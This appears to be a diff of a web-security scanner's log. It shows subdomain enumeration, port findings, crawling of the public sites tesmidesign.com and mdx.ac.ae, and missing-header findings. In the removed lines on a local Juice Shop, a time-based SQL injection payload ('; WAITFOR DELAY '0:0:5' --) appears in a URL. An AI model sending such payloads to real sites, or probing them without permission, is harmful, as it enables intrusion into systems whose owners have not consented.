@@ -1,163 +1,704 @@
-2025-04-13 06:45:11,958 - WebSecScanner - INFO - Scanner initialized for target: https://tesmidesign.com/
-2025-04-13 06:45:11,961 - WebSecScanner - INFO - Starting scan of https://tesmidesign.com/
-2025-04-13 06:45:11,963 - WebSecScanner - INFO - Starting reconnaissance phase
-2025-04-13 06:45:12,917 - WebSecScanner - INFO - Resolved IP: 76.76.21.241
-2025-04-13 06:45:12,918 - WebSecScanner - INFO - Server info: {'Server': 'Vercel'}
-2025-04-13 06:45:13,017 - WebSecScanner - INFO - Detected technologies: ['Vercel']
-2025-04-13 06:45:15,024 - WebSecScanner - INFO - Open ports: [25, 80, 110, 143, 443, 993, 995]
-2025-04-13 06:45:15,110 - WebSecScanner - DEBUG - Found subdomain: www.tesmidesign.com
-2025-04-13 06:45:15,326 - WebSecScanner - DEBUG - Found subdomain: mail.tesmidesign.com
-2025-04-13 06:45:15,580 - WebSecScanner - DEBUG - Found subdomain: ftp.tesmidesign.com
-2025-04-13 06:45:15,839 - WebSecScanner - DEBUG - Found subdomain: smtp.tesmidesign.com
-2025-04-13 06:45:16,016 - WebSecScanner - DEBUG - Found subdomain: pop.tesmidesign.com
-2025-04-13 06:45:16,216 - WebSecScanner - DEBUG - Found subdomain: ns1.tesmidesign.com
-2025-04-13 06:45:16,483 - WebSecScanner - DEBUG - Found subdomain: ns2.tesmidesign.com
-2025-04-13 06:45:16,689 - WebSecScanner - DEBUG - Found subdomain: dns.tesmidesign.com
-2025-04-13 06:45:16,916 - WebSecScanner - DEBUG - Found subdomain: dns1.tesmidesign.com
-2025-04-13 06:45:17,133 - WebSecScanner - DEBUG - Found subdomain: dns2.tesmidesign.com
-2025-04-13 06:45:17,383 - WebSecScanner - DEBUG - Found subdomain: mx.tesmidesign.com
-2025-04-13 06:45:17,596 - WebSecScanner - DEBUG - Found subdomain: mx1.tesmidesign.com
-2025-04-13 06:45:17,809 - WebSecScanner - DEBUG - Found subdomain: mx2.tesmidesign.com
-2025-04-13 06:45:17,992 - WebSecScanner - DEBUG - Found subdomain: webmail.tesmidesign.com
-2025-04-13 06:45:18,186 - WebSecScanner - DEBUG - Found subdomain: remote.tesmidesign.com
-2025-04-13 06:45:18,403 - WebSecScanner - DEBUG - Found subdomain: blog.tesmidesign.com
-2025-04-13 06:45:18,632 - WebSecScanner - DEBUG - Found subdomain: server.tesmidesign.com
-2025-04-13 06:45:18,766 - WebSecScanner - DEBUG - Found subdomain: admin.tesmidesign.com
-2025-04-13 06:45:18,982 - WebSecScanner - DEBUG - Found subdomain: vpn.tesmidesign.com
-2025-04-13 06:45:19,237 - WebSecScanner - DEBUG - Found subdomain: dev.tesmidesign.com
-2025-04-13 06:45:19,458 - WebSecScanner - DEBUG - Found subdomain: test.tesmidesign.com
-2025-04-13 06:45:19,713 - WebSecScanner - DEBUG - Found subdomain: portal.tesmidesign.com
-2025-04-13 06:45:19,946 - WebSecScanner - DEBUG - Found subdomain: api.tesmidesign.com
-2025-04-13 06:45:20,140 - WebSecScanner - DEBUG - Found subdomain: uat.tesmidesign.com
-2025-04-13 06:45:20,328 - WebSecScanner - DEBUG - Found subdomain: stage.tesmidesign.com
-2025-04-13 06:45:20,506 - WebSecScanner - DEBUG - Found subdomain: staging.tesmidesign.com
-2025-04-13 06:45:20,765 - WebSecScanner - DEBUG - Found subdomain: shop.tesmidesign.com
-2025-04-13 06:45:20,998 - WebSecScanner - DEBUG - Found subdomain: store.tesmidesign.com
-2025-04-13 06:45:21,196 - WebSecScanner - DEBUG - Found subdomain: support.tesmidesign.com
-2025-04-13 06:45:21,446 - WebSecScanner - DEBUG - Found subdomain: help.tesmidesign.com
-2025-04-13 06:45:21,646 - WebSecScanner - DEBUG - Found subdomain: apps.tesmidesign.com
-2025-04-13 06:45:21,906 - WebSecScanner - DEBUG - Found subdomain: app.tesmidesign.com
-2025-04-13 06:45:22,123 - WebSecScanner - DEBUG - Found subdomain: m.tesmidesign.com
-2025-04-13 06:45:22,338 - WebSecScanner - DEBUG - Found subdomain: mobile.tesmidesign.com
-2025-04-13 06:45:22,572 - WebSecScanner - DEBUG - Found subdomain: files.tesmidesign.com
-2025-04-13 06:45:22,817 - WebSecScanner - DEBUG - Found subdomain: forms.tesmidesign.com
-2025-04-13 06:45:22,826 - WebSecScanner - INFO - Found 36 subdomains
-2025-04-13 06:45:22,826 - WebSecScanner - INFO - Starting website crawling
-2025-04-13 06:45:23,681 - WebSecScanner - INFO - [Crawl] Visiting: https://tesmidesign.com/
-2025-04-13 06:45:33,476 - WebSecScanner - INFO - [Crawl] Visiting: https://www.tesmidesign.com/login
-2025-04-13 06:45:35,903 - WebSecScanner - INFO - [Crawl] Visiting: https://www.tesmidesign.com/products/6769fe127f6812840f992109
-2025-04-13 06:46:05,912 - WebSecScanner - DEBUG - Error JS crawling https://www.tesmidesign.com/products/6769fe127f6812840f992109: Page.goto: Timeout 30000ms exceeded.
+2025-04-13 18:12:31,886 - WebSecScanner - INFO - Scanner initialized for target: https://www.mdx.ac.ae/
+2025-04-13 18:12:31,896 - WebSecScanner - INFO - Starting scan of https://www.mdx.ac.ae/
+2025-04-13 18:12:32,007 - WebSecScanner - INFO - Starting reconnaissance phase
+2025-04-13 18:12:33,491 - WebSecScanner - INFO - Resolved IP: 104.26.15.232
+2025-04-13 18:12:33,497 - WebSecScanner - INFO - Server info: {'x-powered-by': 'Next.js', 'Server': 'cloudflare'}
+2025-04-13 18:12:34,490 - WebSecScanner - INFO - Detected technologies: ['Next.js', 'cloudflare']
+2025-04-13 18:12:36,536 - WebSecScanner - INFO - Open ports: [25, 80, 110, 143, 443, 993, 995, 8080, 8443]
+2025-04-13 18:12:36,578 - WebSecScanner - DEBUG - Found subdomain: www.mdx.ac.ae
+2025-04-13 18:12:36,746 - WebSecScanner - DEBUG - Found subdomain: mail.mdx.ac.ae
+2025-04-13 18:12:38,218 - WebSecScanner - DEBUG - Found subdomain: test.mdx.ac.ae
+2025-04-13 18:12:38,276 - WebSecScanner - DEBUG - Found subdomain: api.mdx.ac.ae
+2025-04-13 18:12:39,098 - WebSecScanner - INFO - Found 4 subdomains
+2025-04-13 18:12:39,099 - WebSecScanner - INFO - Starting website crawling
+2025-04-13 18:12:40,848 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/
+2025-04-13 18:12:57,059 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/courses/accounting-and-finance
+2025-04-13 18:13:01,967 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/research/research-seminar-series
+2025-04-13 18:13:06,962 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/it-top-up
+2025-04-13 18:13:36,998 - WebSecScanner - DEBUG - Error JS crawling https://www.mdx.ac.ae/it-top-up: Page.goto: Timeout 30000ms exceeded.
 Call log:
-  - navigating to "https://www.tesmidesign.com/products/6769fe127f6812840f992109", waiting until "networkidle"
+  - navigating to "https://www.mdx.ac.ae/it-top-up", waiting until "networkidle"
 
-2025-04-13 06:46:05,912 - WebSecScanner - INFO - [Crawl] Visiting: https://www.tesmidesign.com/
-2025-04-13 06:46:08,067 - WebSecScanner - INFO - [Crawl] Visiting: https://www.tesmidesign.com/products/6769fe137f6812840f99210e
-2025-04-13 06:46:20,006 - WebSecScanner - INFO - [Crawl] Visiting: https://www.tesmidesign.com/products/6769fe147f6812840f992113
-2025-04-13 06:46:31,828 - WebSecScanner - INFO - [Crawl] Visiting: https://www.tesmidesign.com/cart
-2025-04-13 06:46:33,328 - WebSecScanner - INFO - [Crawl] Visiting: https://www.tesmidesign.com/products/6769fe167f6812840f99211d
-2025-04-13 06:46:45,177 - WebSecScanner - INFO - [Crawl] Visiting: https://www.tesmidesign.com/products/6769fe157f6812840f992118
-2025-04-13 06:46:57,198 - WebSecScanner - INFO - [Crawl] Visiting: https://www.tesmidesign.com/products/6769fe177f6812840f992122
-2025-04-13 06:47:09,116 - WebSecScanner - INFO - [Crawl] Visiting: https://www.tesmidesign.com/products/6769fe087f6812840f9920fa
-2025-04-13 06:47:39,131 - WebSecScanner - DEBUG - Error JS crawling https://www.tesmidesign.com/products/6769fe087f6812840f9920fa: Page.goto: Timeout 30000ms exceeded.
+2025-04-13 18:13:37,003 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/mdxaccommodation
+2025-04-13 18:14:07,046 - WebSecScanner - DEBUG - Error JS crawling https://www.mdx.ac.ae/mdxaccommodation: Page.goto: Timeout 30000ms exceeded.
 Call log:
-  - navigating to "https://www.tesmidesign.com/products/6769fe087f6812840f9920fa", waiting until "networkidle"
+  - navigating to "https://www.mdx.ac.ae/mdxaccommodation", waiting until "networkidle"
 
-2025-04-13 06:47:39,133 - WebSecScanner - INFO - [Crawl] Visiting: https://www.tesmidesign.com/productlist
-2025-04-13 06:47:41,192 - WebSecScanner - INFO - [Crawl] Visiting: https://www.tesmidesign.com/products/6769fe067f6812840f9920f5
-2025-04-13 06:47:53,127 - WebSecScanner - INFO - [Crawl] Visiting: https://www.tesmidesign.com/products/6769fe117f6812840f992104
-2025-04-13 06:48:05,106 - WebSecScanner - INFO - [Crawl] Visiting: https://www.tesmidesign.com/products/6769fe107f6812840f9920ff
-2025-04-13 06:48:16,928 - WebSecScanner - INFO - [Crawl] Visiting: https://www.tesmidesign.com/products/6769fe427f6812840f992136
-2025-04-13 06:48:28,805 - WebSecScanner - INFO - [Crawl] Visiting: https://www.tesmidesign.com/products/6769fe437f6812840f99213b
-2025-04-13 06:48:40,635 - WebSecScanner - INFO - [Crawl] Visiting: https://www.tesmidesign.com/products/6769fe1a7f6812840f99212c
-2025-04-13 06:48:52,435 - WebSecScanner - INFO - [Crawl] Visiting: https://www.tesmidesign.com/products/6769fe197f6812840f992127
-2025-04-13 06:49:04,345 - WebSecScanner - INFO - [Crawl] Visiting: https://www.tesmidesign.com/products/6769fe1b7f6812840f992131
-2025-04-13 06:49:16,507 - WebSecScanner - INFO - Crawling completed. Found 20 endpoints and 34 forms
-2025-04-13 06:49:16,509 - WebSecScanner - INFO - Starting security scans
-2025-04-13 06:49:16,509 - WebSecScanner - INFO - Scanning for XSS vulnerabilities
-2025-04-13 06:49:16,514 - WebSecScanner - INFO - Scanning for SQL Injection vulnerabilities
-2025-04-13 06:49:16,515 - WebSecScanner - INFO - Scanning for CSRF vulnerabilities
-2025-04-13 06:49:16,515 - WebSecScanner - INFO - Scanning security headers
-2025-04-13 06:49:16,620 - WebSecScanner - INFO - [+] Vulnerability recorded: Missing Content-Security-Policy Header at https://tesmidesign.com/
-2025-04-13 06:49:16,620 - WebSecScanner - INFO - [+] Vulnerability recorded: Missing X-XSS-Protection Header at https://tesmidesign.com/
-2025-04-13 06:49:16,620 - WebSecScanner - INFO - [+] Vulnerability recorded: Missing X-Content-Type-Options Header at https://tesmidesign.com/
-2025-04-13 06:49:16,623 - WebSecScanner - INFO - [+] Vulnerability recorded: Missing X-Frame-Options Header at https://tesmidesign.com/
-2025-04-13 06:49:16,624 - WebSecScanner - INFO - [+] Vulnerability recorded: Missing Referrer-Policy Header at https://tesmidesign.com/
-2025-04-13 06:49:16,624 - WebSecScanner - INFO - [+] Vulnerability recorded: Missing Permissions-Policy Header at https://tesmidesign.com/
-2025-04-13 06:49:16,624 - WebSecScanner - INFO - [+] Vulnerability recorded: Information Disclosure in HTTP Headers at https://tesmidesign.com/
-2025-04-13 06:49:16,625 - WebSecScanner - INFO - Scanning session security
-2025-04-13 06:49:16,714 - WebSecScanner - INFO - Security scans completed
-2025-04-13 06:49:16,731 - WebSecScanner - INFO - Report generated: reports\scan-20250413_064916.html
-2025-04-13 06:49:16,732 - WebSecScanner - INFO - Scan completed in 244.77 seconds
-2025-04-13 06:49:16,733 - WebSecScanner - INFO - Found 7 vulnerabilities
-2025-04-13 07:01:16,436 - WebSecScanner - INFO - Scanner initialized for target: http://localhost:3000/#/
-2025-04-13 07:01:16,436 - WebSecScanner - INFO - Starting scan of http://localhost:3000/#/
-2025-04-13 07:01:16,440 - WebSecScanner - INFO - Starting reconnaissance phase
-2025-04-13 07:01:16,459 - WebSecScanner - WARNING - Could not resolve hostname: localhost:3000
-2025-04-13 07:01:16,460 - WebSecScanner - INFO - Server info: {}
-2025-04-13 07:01:16,470 - WebSecScanner - INFO - Detected technologies: ['jquery']
-2025-04-13 07:01:16,471 - WebSecScanner - WARNING - IP address not resolved, skipping port scan
-2025-04-13 07:01:17,377 - WebSecScanner - INFO - Found 0 subdomains
-2025-04-13 07:01:17,380 - WebSecScanner - INFO - Starting website crawling
-2025-04-13 07:01:18,212 - WebSecScanner - INFO - [Crawl] Visiting: http://localhost:3000/#/
-2025-04-13 07:01:22,724 - WebSecScanner - INFO - [Crawl] Visiting: http://localhost:3000/#/about
-2025-04-13 07:01:23,302 - WebSecScanner - INFO - [Crawl] Visiting: http://localhost:3000/redirect?to=https://github.com/juice-shop/juice-shop
-2025-04-13 07:01:27,535 - WebSecScanner - INFO - [Crawl] Visiting: http://localhost:3000/ftp/legal.md
-2025-04-13 07:01:28,647 - WebSecScanner - INFO - [Crawl] Visiting: http://localhost:3000/#/login
-2025-04-13 07:01:30,186 - WebSecScanner - INFO - [Crawl] Visiting: http://localhost:3000/#/photo-wall
-2025-04-13 07:01:30,725 - WebSecScanner - INFO - [Crawl] Visiting: http://localhost:3000/#/contact
-2025-04-13 07:01:31,291 - WebSecScanner - INFO - [Crawl] Visiting: http://localhost:3000/#/register
-2025-04-13 07:01:31,841 - WebSecScanner - INFO - [Crawl] Visiting: http://localhost:3000/
-2025-04-13 07:01:33,267 - WebSecScanner - INFO - [Crawl] Visiting: http://localhost:3000/#/forgot-password
-2025-04-13 07:01:33,880 - WebSecScanner - INFO - Crawling completed. Found 10 endpoints and 3 forms
-2025-04-13 07:01:33,883 - WebSecScanner - INFO - Starting security scans
-2025-04-13 07:01:33,883 - WebSecScanner - INFO - Scanning for XSS vulnerabilities
-2025-04-13 07:01:49,440 - WebSecScanner - INFO - Scanning for SQL Injection vulnerabilities
-2025-04-13 07:02:35,927 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at http://localhost:3000/redirect?to=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27+--
-2025-04-13 07:02:35,929 - WebSecScanner - INFO - Scanning for CSRF vulnerabilities
-2025-04-13 07:02:35,929 - WebSecScanner - INFO - Scanning security headers
-2025-04-13 07:02:35,936 - WebSecScanner - INFO - [+] Vulnerability recorded: Missing Content-Security-Policy Header at http://localhost:3000/#/
-2025-04-13 07:02:35,936 - WebSecScanner - INFO - [+] Vulnerability recorded: Missing X-XSS-Protection Header at http://localhost:3000/#/
-2025-04-13 07:02:35,936 - WebSecScanner - INFO - [+] Vulnerability recorded: Missing Strict-Transport-Security Header at http://localhost:3000/#/
-2025-04-13 07:02:35,941 - WebSecScanner - INFO - [+] Vulnerability recorded: Missing Referrer-Policy Header at http://localhost:3000/#/
-2025-04-13 07:02:35,942 - WebSecScanner - INFO - [+] Vulnerability recorded: Missing Permissions-Policy Header at http://localhost:3000/#/
-2025-04-13 07:02:35,943 - WebSecScanner - INFO - Scanning session security
-2025-04-13 07:02:35,951 - WebSecScanner - INFO - Security scans completed
-2025-04-13 07:02:35,963 - WebSecScanner - INFO - Report generated: reports\scan-20250413_070235.html
-2025-04-13 07:02:35,964 - WebSecScanner - INFO - Scan completed in 79.53 seconds
-2025-04-13 07:02:35,964 - WebSecScanner - INFO - Found 6 vulnerabilities
-2025-04-13 07:05:39,009 - WebSecScanner - INFO - Scanner initialized for target: http://localhost:3000/#/
-2025-04-13 07:05:39,009 - WebSecScanner - INFO - Starting scan of http://localhost:3000/#/
-2025-04-13 07:05:39,015 - WebSecScanner - INFO - Starting reconnaissance phase
-2025-04-13 07:05:39,029 - WebSecScanner - WARNING - Could not resolve hostname: localhost:3000
-2025-04-13 07:05:39,029 - WebSecScanner - INFO - Server info: {}
-2025-04-13 07:05:39,037 - WebSecScanner - INFO - Detected technologies: ['jquery']
-2025-04-13 07:05:39,038 - WebSecScanner - WARNING - IP address not resolved, skipping port scan
-2025-04-13 07:05:39,940 - WebSecScanner - INFO - Found 0 subdomains
-2025-04-13 07:05:39,943 - WebSecScanner - INFO - Starting website crawling
-2025-04-13 07:05:40,675 - WebSecScanner - INFO - [Crawl] Visiting: http://localhost:3000/#/
-2025-04-13 07:05:42,351 - WebSecScanner - INFO - [Crawl] Visiting: http://localhost:3000/#/login
-2025-04-13 07:05:42,929 - WebSecScanner - INFO - [Crawl] Visiting: http://localhost:3000/redirect?to=https://github.com/juice-shop/juice-shop
-2025-04-13 07:05:46,425 - WebSecScanner - INFO - [Crawl] Visiting: http://localhost:3000/#/contact
-2025-04-13 07:05:48,011 - WebSecScanner - INFO - [Crawl] Visiting: http://localhost:3000/#/photo-wall
-2025-04-13 07:05:48,564 - WebSecScanner - INFO - [Crawl] Visiting: http://localhost:3000/#/about
-2025-04-13 07:05:49,135 - WebSecScanner - INFO - [Crawl] Visiting: http://localhost:3000/#/register
-2025-04-13 07:05:49,701 - WebSecScanner - INFO - [Crawl] Visiting: http://localhost:3000/#/forgot-password
-2025-04-13 07:05:50,241 - WebSecScanner - INFO - [Crawl] Visiting: http://localhost:3000/
-2025-04-13 07:05:51,674 - WebSecScanner - INFO - [Crawl] Visiting: http://localhost:3000/ftp/legal.md
-2025-04-13 07:05:52,809 - WebSecScanner - INFO - Crawling completed. Found 10 endpoints and 3 forms
-2025-04-13 07:05:52,813 - WebSecScanner - INFO - Starting security scans
-2025-04-13 07:05:52,813 - WebSecScanner - INFO - Scanning for XSS vulnerabilities
-2025-04-13 07:06:08,488 - WebSecScanner - INFO - Scanning for SQL Injection vulnerabilities
-2025-04-13 07:06:55,000 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at http://localhost:3000/redirect?to=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27+--
-2025-04-13 07:06:55,002 - WebSecScanner - INFO - Scanning for CSRF vulnerabilities
-2025-04-13 07:06:55,002 - WebSecScanner - INFO - Scanning security headers
-2025-04-13 07:06:55,007 - WebSecScanner - INFO - [+] Vulnerability recorded: Missing Content-Security-Policy Header at http://localhost:3000/#/
-2025-04-13 07:06:55,007 - WebSecScanner - INFO - [+] Vulnerability recorded: Missing X-XSS-Protection Header at http://localhost:3000/#/
-2025-04-13 07:06:55,010 - WebSecScanner - INFO - [+] Vulnerability recorded: Missing Strict-Transport-Security Header at http://localhost:3000/#/
-2025-04-13 07:06:55,010 - WebSecScanner - INFO - [+] Vulnerability recorded: Missing Referrer-Policy Header at http://localhost:3000/#/
-2025-04-13 07:06:55,010 - WebSecScanner - INFO - [+] Vulnerability recorded: Missing Permissions-Policy Header at http://localhost:3000/#/
-2025-04-13 07:06:55,011 - WebSecScanner - INFO - Scanning session security
-2025-04-13 07:06:55,016 - WebSecScanner - INFO - Security scans completed
-2025-04-13 07:06:55,030 - WebSecScanner - INFO - Report generated: reports\scan-20250413_070655.html
-2025-04-13 07:06:55,031 - WebSecScanner - INFO - Scan completed in 76.02 seconds
-2025-04-13 07:06:55,031 - WebSecScanner - INFO - Found 6 vulnerabilities
+2025-04-13 18:14:07,050 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/scholarships-and-grants
+2025-04-13 18:14:15,440 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/cim
+2025-04-13 18:14:20,701 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/srilanka
+2025-04-13 18:14:50,710 - WebSecScanner - DEBUG - Error JS crawling https://www.mdx.ac.ae/srilanka: Page.goto: Timeout 30000ms exceeded.
+Call log:
+  - navigating to "https://www.mdx.ac.ae/srilanka", waiting until "networkidle"
+
+2025-04-13 18:14:50,719 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/research/souq-economics-center-for-economics-research
+2025-04-13 18:15:00,118 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/economic-insights/identifying-drivers-and-hindrances-to-smartphones-disposal-a-study-of-user-behaviour-in-the-uae
+2025-04-13 18:15:30,134 - WebSecScanner - DEBUG - Error JS crawling https://www.mdx.ac.ae/economic-insights/identifying-drivers-and-hindrances-to-smartphones-disposal-a-study-of-user-behaviour-in-the-uae: Page.goto: Timeout 30000ms exceeded.
+Call log:
+  - navigating to "https://www.mdx.ac.ae/economic-insights/identifying-drivers-and-hindrances-to-smartphones-disposal-a-study-of-user-behaviour-in-the-uae", waiting until "networkidle"
+
+2025-04-13 18:15:30,134 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/ourstrategy2031
+2025-04-13 18:15:34,981 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/research/research-committee
+2025-04-13 18:15:41,042 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/executive-certificate-in-uae-data-protection-law
+2025-04-13 18:16:11,051 - WebSecScanner - DEBUG - Error JS crawling https://www.mdx.ac.ae/executive-certificate-in-uae-data-protection-law: Page.goto: Timeout 30000ms exceeded.
+Call log:
+  - navigating to "https://www.mdx.ac.ae/executive-certificate-in-uae-data-protection-law", waiting until "networkidle"
+
+2025-04-13 18:16:11,052 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/courses/psychology
+2025-04-13 18:16:15,528 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/health-and-safety
+2025-04-13 18:16:45,541 - WebSecScanner - DEBUG - Error JS crawling https://www.mdx.ac.ae/health-and-safety: Page.goto: Timeout 30000ms exceeded.
+Call log:
+  - navigating to "https://www.mdx.ac.ae/health-and-safety", waiting until "networkidle"
+
+2025-04-13 18:16:45,556 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/e/about-us/our-people/staff-detail/matthew-stuart-brown
+2025-04-13 18:17:15,598 - WebSecScanner - DEBUG - Error JS crawling https://www.mdx.ac.ae/e/about-us/our-people/staff-detail/matthew-stuart-brown: Page.goto: Timeout 30000ms exceeded.
+Call log:
+  - navigating to "https://www.mdx.ac.ae/e/about-us/our-people/staff-detail/matthew-stuart-brown", waiting until "networkidle"
+
+2025-04-13 18:17:15,599 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/mdx-subject-specific-camps
+2025-04-13 18:17:20,029 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/ifp
+2025-04-13 18:17:50,053 - WebSecScanner - DEBUG - Error JS crawling https://www.mdx.ac.ae/ifp: Page.goto: Timeout 30000ms exceeded.
+Call log:
+  - navigating to "https://www.mdx.ac.ae/ifp", waiting until "networkidle"
+
+2025-04-13 18:17:50,056 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/courses/course-list/course-detail/mba-daytime
+2025-04-13 18:17:57,514 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/diac-campus
+2025-04-13 18:18:02,950 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/economic-insights/controlling-contagion-epidemics-and-institutions-from-the-black-death-to-covid
+2025-04-13 18:18:06,476 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/economic-insights/doubling-of-dubai-s-economy-in-a-decade-d33-provides-a-realistic-blueprint
+2025-04-13 18:18:36,489 - WebSecScanner - DEBUG - Error JS crawling https://www.mdx.ac.ae/economic-insights/doubling-of-dubai-s-economy-in-a-decade-d33-provides-a-realistic-blueprint: Page.goto: Timeout 30000ms exceeded.
+Call log:
+  - navigating to "https://www.mdx.ac.ae/economic-insights/doubling-of-dubai-s-economy-in-a-decade-d33-provides-a-realistic-blueprint", waiting until "networkidle"
+
+2025-04-13 18:18:36,489 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/about-us/our-past
+2025-04-13 18:18:40,510 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/souq-economics-center-for-economics-research#
+2025-04-13 18:18:44,592 - WebSecScanner - INFO - [Crawl] Visiting: https://api.mdx.ac.ae/uploads/snapcode_mdx_23f80eeb6f.png?updated_at=2022-09-03T18:05:30.803Z
+2025-04-13 18:18:46,530 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/about-us/our-people/staff-detail/matthew-stuart-brown
+2025-04-13 18:18:52,096 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/news/new-head-of-souq-economics-announced
+2025-04-13 18:19:22,129 - WebSecScanner - DEBUG - Error JS crawling https://www.mdx.ac.ae/news/new-head-of-souq-economics-announced: Page.goto: Timeout 30000ms exceeded.
+Call log:
+  - navigating to "https://www.mdx.ac.ae/news/new-head-of-souq-economics-announced", waiting until "networkidle"
+
+2025-04-13 18:19:22,129 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/juris
+2025-04-13 18:19:26,268 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/cipd-certificate
+2025-04-13 18:19:31,218 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/souq-economics-center-for-economics-research
+2025-04-13 18:20:01,224 - WebSecScanner - DEBUG - Error JS crawling https://www.mdx.ac.ae/souq-economics-center-for-economics-research: Page.goto: Timeout 30000ms exceeded.
+Call log:
+  - navigating to "https://www.mdx.ac.ae/souq-economics-center-for-economics-research", waiting until "networkidle"
+
+2025-04-13 18:20:01,225 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/cipd-certificate#COST
+2025-04-13 18:20:05,896 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/khda-higher-education-classification
+2025-04-13 18:20:10,202 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/courses/course-list/course-detail/bsc-honours-psychology-with-education
+2025-04-13 18:20:40,221 - WebSecScanner - DEBUG - Error JS crawling https://www.mdx.ac.ae/courses/course-list/course-detail/bsc-honours-psychology-with-education: Page.goto: Timeout 30000ms exceeded.
+Call log:
+  - navigating to "https://www.mdx.ac.ae/courses/course-list/course-detail/bsc-honours-psychology-with-education", waiting until "networkidle"
+
+2025-04-13 18:20:40,223 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/juris#MESSAGE%20FROM%20THE%20HEAD
+2025-04-13 18:20:44,637 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/about-us/accreditation
+2025-04-13 18:20:48,843 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/student-support-hub
+2025-04-13 18:20:54,811 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/contact-us/contact-details/dkp
+2025-04-13 18:21:24,830 - WebSecScanner - DEBUG - Error JS crawling https://www.mdx.ac.ae/contact-us/contact-details/dkp: Page.goto: Timeout 30000ms exceeded.
+Call log:
+  - navigating to "https://www.mdx.ac.ae/contact-us/contact-details/dkp", waiting until "networkidle"
+
+2025-04-13 18:21:24,830 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/honorary-doctorates
+2025-04-13 18:21:28,860 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/about-us/our-people/staff-detail/ryan-stephenson
+2025-04-13 18:21:58,872 - WebSecScanner - DEBUG - Error JS crawling https://www.mdx.ac.ae/about-us/our-people/staff-detail/ryan-stephenson: Page.goto: Timeout 30000ms exceeded.
+Call log:
+  - navigating to "https://www.mdx.ac.ae/about-us/our-people/staff-detail/ryan-stephenson", waiting until "networkidle"
+
+2025-04-13 18:21:58,872 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/courses/course-list/course-detail/mba-daytime#pathway
+2025-04-13 18:22:04,567 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/about-us/our-people/staff-detail/cody-paris
+2025-04-13 18:22:09,371 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/cim-accredited
+2025-04-13 18:22:39,377 - WebSecScanner - DEBUG - Error JS crawling https://www.mdx.ac.ae/cim-accredited: Page.goto: Timeout 30000ms exceeded.
+Call log:
+  - navigating to "https://www.mdx.ac.ae/cim-accredited", waiting until "networkidle"
+
+2025-04-13 18:22:39,377 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/south-africa
+2025-04-13 18:23:09,390 - WebSecScanner - DEBUG - Error JS crawling https://www.mdx.ac.ae/south-africa: Page.goto: Timeout 30000ms exceeded.
+Call log:
+  - navigating to "https://www.mdx.ac.ae/south-africa", waiting until "networkidle"
+
+2025-04-13 18:23:09,392 - WebSecScanner - INFO - [Crawl] Visiting: https://mdxstudios.mdx.ac.ae/
+2025-04-13 18:23:22,271 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/about-us/honorary-doctorates/sultan-ahmed-bin-sulaye
+2025-04-13 18:23:27,079 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/call-back
+2025-04-13 18:23:32,571 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/event/wednesday-research-seminar-series-identity-matching-of-social-network-users-across-multiple-online-social-networks
+2025-04-13 18:23:40,956 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/industrypartnerships
+2025-04-13 18:23:44,945 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/about-us/honorary-doctorates/misho-ravic
